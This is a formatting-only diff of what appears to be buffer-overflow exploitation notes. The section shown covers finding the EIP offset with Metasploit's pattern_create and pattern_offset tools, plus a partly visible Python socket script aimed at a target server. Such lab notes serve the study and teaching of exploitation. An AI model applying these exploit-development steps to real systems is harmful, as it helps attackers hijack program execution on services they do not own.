@@ -1,12 +1,12 @@
 3-Finding the Offset
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
 
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q eipvalue
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~python
 #!/usr/bin/python
 import sys, socket
 
@@ -22,4 +22,5 @@ except:
 	print "Error Connecting to Server..."
 	sys.exit()
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
+
